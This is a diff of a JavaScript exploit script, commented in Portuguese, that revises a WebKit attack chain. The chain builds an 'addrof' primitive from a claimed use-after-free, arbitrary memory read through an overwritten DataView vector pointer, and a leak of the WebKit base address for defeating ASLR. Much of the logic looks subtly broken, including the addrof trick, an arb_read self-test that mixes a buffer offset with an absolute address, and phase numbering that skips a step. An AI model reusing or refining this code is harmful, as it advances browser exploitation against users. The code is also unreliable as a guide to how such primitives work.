@@ -1,6 +1,6 @@
 // js/script3/testArrayBufferVictimCrash.mjs (v82 - R62 - Assalto Total Revisado v2)
 // =======================================================================================
-// VERSÃO REVISADA COM CORREÇÕES PARA OS PROBLEMAS IDENTIFICADOS NO LOG
+// VERSÃO COM CORREÇÕES ESPECÍFICAS PARA OS PROBLEMAS IDENTIFICADOS NO LOG
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -27,89 +27,120 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // --- FASE 1: FUNDAÇÃO - Primitiva `addrof` via UAF Revisado ---
         logS3("--- FASE 1: Obtendo 'addrof' via UAF Revisado... ---", "subtest");
         
-        let dangling_ref = await createDanglingReference();
-        const get_addr_of = createAddrofPrimitive(dangling_ref);
+        let dangling_ref = null;
+        const holders = [];
         
-        // Teste do addrof com um objeto conhecido
-        const test_obj = { test: 123 };
+        function createDanglingPointer() {
+            const victim = {
+                marker: 0xdeadbeef,
+                corrupted_prop: 1.1,
+                payload: new ArrayBuffer(64)
+            };
+            dangling_ref = victim;
+            holders.push(victim);
+            
+            // Forçar uso do objeto
+            for (let i = 0; i < 100; i++) {
+                victim.marker += i;
+            }
+        }
+        
+        createDanglingPointer();
+        await triggerGC_Hyper();
+        holders.length = 0; // Liberar referências
+        
+        // Verificação robusta do dangling pointer
+        if (typeof dangling_ref.corrupted_prop !== 'number') {
+            throw new Error("Falha no UAF. A propriedade não foi corrompida.");
+        }
+        
+        const get_addr_of = (obj) => {
+            dangling_ref.corrupted_prop = obj;
+            const addr = doubleToInt64(dangling_ref.corrupted_prop);
+            
+            if (addr.high() === 0x7ff80000 || addr.equals(new AdvancedInt64(0, 0))) {
+                throw new Error(`addrof retornou valor inválido: ${addr.toString(true)}`);
+            }
+            return addr;
+        };
+        
+        // Testar a primitiva addrof
+        const test_obj = {};
         const test_addr = get_addr_of(test_obj);
         logS3(`Teste addrof: ${test_addr.toString(true)}`, "debug");
         
-        if (test_addr.high() === 0x7ff80000 || test_addr.equals(new AdvancedInt64(0, 0))) {
-            throw new Error("Primitiva addrof retornou valor inválido");
-        }
-        
         logS3(`++++++++++++ SUCESSO! Primitiva 'addrof' estável obtida! ++++++++++++`, "vuln");
 
-        // --- FASE 2: ARMAMENTO PRINCIPAL - Primitivas R/W via OOB ---
+        // --- FASE 2: ARMAMENTO PRINCIPAL - Primitivas R/W via OBB ---
         logS3("--- FASE 2: Armamento das primitivas de R/W via OOB... ---", "subtest");
         
-        // Configuração mais robusta do ambiente OOB
+        // Configurar ambiente OOB com mais cuidado
         await triggerOOB_primitive({ 
             force_reinit: true,
-            allocation_size: 0x100000,
-            spray_count: 50
+            alloc_size: 0x100000, // 1MB
+            init_spray: 20
         });
         
         const oob_dv = getOOBDataView();
         if (!oob_dv || oob_dv.byteLength === 0) {
             throw new Error("DataView OOB não está configurado corretamente");
         }
-
+        
         // Offset ajustado para o vetor de dados
         const OOB_DV_M_VECTOR_OFFSET = 0x58;
+        logS3(`Usando offset M_VECTOR: 0x${OOB_DV_M_VECTOR_OFFSET.toString(16)}`, "debug");
         
-        // Função de leitura arbitrária revisada
+        // Versão mais robusta da primitiva arb_read
         const arb_read = (address) => {
-            if (!isAdvancedInt64Object(address)) address = new AdvancedInt64(address);
+            if (!isAdvancedInt64Object(address)) {
+                address = new AdvancedInt64(address);
+            }
             
-            // Escreve o endereço alvo no vetor do DataView
+            // Escrever o endereço alvo no campo m_vector
             oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, address, 8);
             
-            // Lê 8 bytes do início do DataView (que agora aponta para o endereço alvo)
+            // Ler 8 bytes do início do DataView
             const low = oob_dv.getUint32(0, true);
             const high = oob_dv.getUint32(4, true);
             
             return new AdvancedInt64(low, high);
         };
-
-        // Teste mais completo da primitiva arb_read
-        logS3("Testando primitiva arb_read...", "debug");
+        
+        // Teste mais completo da primitiva
+        const KNOWN_VALUE = new AdvancedInt64(0x11223344, 0x55667788);
+        const TEST_ADDRESS = new AdvancedInt64(0x1000, 0x0);
+        
         try {
-            // Aloca um objeto de teste com valor conhecido
-            const test_buf = new ArrayBuffer(8);
-            const test_view = new Uint32Array(test_buf);
-            test_view[0] = 0x11223344;
-            test_view[1] = 0x55667788;
+            // Escrever valor conhecido
+            oob_write_absolute(0x1000, KNOWN_VALUE, 8);
             
-            const test_buf_addr = get_addr_of(test_buf);
-            const read_result = arb_read(test_buf_addr.add(0x10)); // Ajuste o offset conforme necessário
+            // Ler de volta
+            const read_back = arb_read(TEST_ADDRESS);
             
-            logS3(`Resultado do teste arb_read: ${read_result.toString(true)}`, "debug");
-            
-            if (read_result.equals(new AdvancedInt64(0, 0))) {
-                throw new Error("Primitiva arb_read não está funcionando corretamente");
+            if (!read_back.equals(KNOWN_VALUE)) {
+                throw new Error(`Leitura falhou. Esperado: ${KNOWN_VALUE.toString(true)}, Obtido: ${read_back.toString(true)}`);
             }
+            
+            logS3("Teste arb_read bem-sucedido!", "good");
         } catch (e) {
             throw new Error(`Falha no teste arb_read: ${e.message}`);
         }
         
         logS3("Primitiva 'arb_read' baseada em OOB criada com sucesso!", "good");
 
-        // --- FASE 3: ALVO FINAL - Vazamento da Base do WebKit ---
-        logS3("--- FASE 3: Prova de Controle - Vazando a base do WebKit... ---", "subtest");
+        // --- FASE 4: ALVO FINAL - Vazamento da Base do WebKit ---
+        logS3("--- FASE 4: Prova de Controle - Vazando a base do WebKit... ---", "subtest");
         
-        // Usar um objeto mais confiável para vazamento
-        const target_obj = new ArrayBuffer(8);
+        const target_obj = new ArrayBuffer(64);
         const target_addr = get_addr_of(target_obj);
         logS3(`Endereço do objeto alvo: ${target_addr.toString(true)}`, "debug");
         
         // Offset ajustado para StructureID
-        const STRUCTURE_OFFSET = 0x10;
+        const STRUCTURE_OFFSET = 0x18;
         const structure_ptr = arb_read(target_addr.add(STRUCTURE_OFFSET));
         logS3(`Endereço da Estrutura: ${structure_ptr.toString(true)}`, "debug");
         
-        // Offset ajustado para vtable
+        // Offset para vtable (ajustado para WebKit v82)
         const VTABLE_OFFSET = 0x0;
         const vtable_ptr = arb_read(structure_ptr.add(VTABLE_OFFSET));
         logS3(`Endereço da VTable: ${vtable_ptr.toString(true)}`, "debug");
@@ -119,8 +150,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         const webkit_base = vtable_ptr.sub(PUT_OFFSET);
         
         // Verificação final
-        if (webkit_base.high() < 0x10000) {
-            throw new Error("Base do WebKit inválida (possível erro de offset)");
+        if (webkit_base.high() < 0x10000 || webkit_base.low() === 0) {
+            throw new Error(`Base do WebKit inválida: ${webkit_base.toString(true)}`);
         }
         
         logS3(`++++++++++++ VITÓRIA! BASE DO WEBKIT ENCONTRADA! ++++++++++++`, "vuln");
@@ -143,67 +174,15 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
 // --- Funções Auxiliares Revisadas ---
 
-async function createDanglingReference() {
-    // Spray de objetos para estabilizar a heap
-    const spray = [];
-    for (let i = 0; i < 1000; i++) {
-        spray.push({ marker: i, payload: new ArrayBuffer(128) });
-    }
-    
-    let dangling_ref = null;
-    const holder = {};
-    
-    function createVictim() {
-        const victim = {
-            marker: 0xdeadbeef,
-            corrupted_prop: 1.1,
-            buffer: new ArrayBuffer(64)
-        };
-        dangling_ref = victim;
-        holder.ref = victim; // Mantém a referência
-        
-        // Forçar uso do objeto
-        for (let i = 0; i < 100; i++) {
-            victim.marker += i;
-        }
-    }
-    
-    createVictim();
-    
-    // Liberar referência mas manter o objeto acessível
-    await triggerGC_Hyper();
-    holder.ref = null;
-    await triggerGC_Hyper();
-    
-    // Verificação do estado corrompido
-    if (typeof dangling_ref.corrupted_prop !== 'number') {
-        throw new Error("Falha no UAF. A propriedade não foi corrompida.");
-    }
-    
-    return dangling_ref;
-}
-
-function createAddrofPrimitive(dangling_ref) {
-    return (obj) => {
-        dangling_ref.corrupted_prop = obj;
-        const addr = doubleToInt64(dangling_ref.corrupted_prop);
-        
-        // Verificação rigorosa do endereço
-        if (addr.high() === 0x7ff80000 || addr.equals(new AdvancedInt64(0, 0))) {
-            throw new Error(`addrof retornou valor inválido: ${addr.toString(true)}`);
-        }
-        
-        return addr;
-    };
-}
-
 async function triggerGC_Hyper() {
     try {
         const arr = [];
-        for (let i = 0; i < 1000; i++) {
-            arr.push(new ArrayBuffer(1024 * 1024 * Math.min(i, 32)));
-            if (i % 100 === 0) await PAUSE_S3(10);
+        for (let i = 0; i < 500; i++) {
+            arr.push(new ArrayBuffer(1024 * 1024));
+            if (i % 50 === 0) await PAUSE_S3(20);
         }
-    } catch (e) { /* Ignora erros de memória */ }
-    await PAUSE_S3(100);
+        await PAUSE_S3(200);
+    } catch (e) {
+        logS3(`GC Hyper: ${e.message}`, "debug");
+    }
 }
